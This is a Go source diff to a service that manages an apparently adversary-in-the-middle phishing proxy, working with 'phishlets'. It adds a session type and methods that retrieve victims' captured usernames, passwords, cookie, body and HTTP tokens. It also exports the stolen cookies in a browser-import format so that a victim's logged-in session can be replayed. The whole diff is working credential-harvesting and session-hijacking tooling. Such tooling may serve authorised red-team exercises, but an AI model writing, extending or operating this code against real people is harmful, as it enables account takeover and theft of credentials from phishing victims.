@@ -290,3 +290,57 @@ func (s *MiragedService) PushPhishlet(connectionID, yamlContent string) error {
 	_, err = mirageClient.PushPhishlet(miragesdk.PushPhishletRequest{YAML: yamlContent})
 	return err
 }
+
+// MiragedSession holds the full session details fetched from miraged.
+type MiragedSession struct {
+	ID           string
+	Phishlet     string
+	RemoteAddr   string
+	UserAgent    string
+	Username     string
+	Password     string
+	Custom       map[string]string
+	CookieTokens map[string]map[string]string
+	BodyTokens   map[string]string
+	HTTPTokens   map[string]string
+	StartedAt    string
+	CompletedAt  string
+}
+
+// GetSession retrieves full session details from the miraged instance.
+func (s *MiragedService) GetSession(connectionID, sessionID string) (*MiragedSession, error) {
+	mirageClient, err := s.client(connectionID)
+	if err != nil {
+		return nil, err
+	}
+	resp, err := mirageClient.GetSession(sessionID)
+	if err != nil {
+		return nil, err
+	}
+	session := &MiragedSession{
+		ID:           resp.ID,
+		Phishlet:     resp.Phishlet,
+		RemoteAddr:   resp.RemoteAddr,
+		UserAgent:    resp.UserAgent,
+		Username:     resp.Username,
+		Password:     resp.Password,
+		Custom:       resp.Custom,
+		CookieTokens: resp.CookieTokens,
+		BodyTokens:   resp.BodyTokens,
+		HTTPTokens:   resp.HTTPTokens,
+		StartedAt:    resp.StartedAt.Format(time.RFC3339),
+	}
+	if resp.CompletedAt != nil {
+		session.CompletedAt = resp.CompletedAt.Format(time.RFC3339)
+	}
+	return session, nil
+}
+
+// ExportSessionCookies returns captured cookies in StorageAce browser import format.
+func (s *MiragedService) ExportSessionCookies(connectionID, sessionID string) ([]byte, error) {
+	mirageClient, err := s.client(connectionID)
+	if err != nil {
+		return nil, err
+	}
+	return mirageClient.ExportSessionCookies(sessionID)
+}
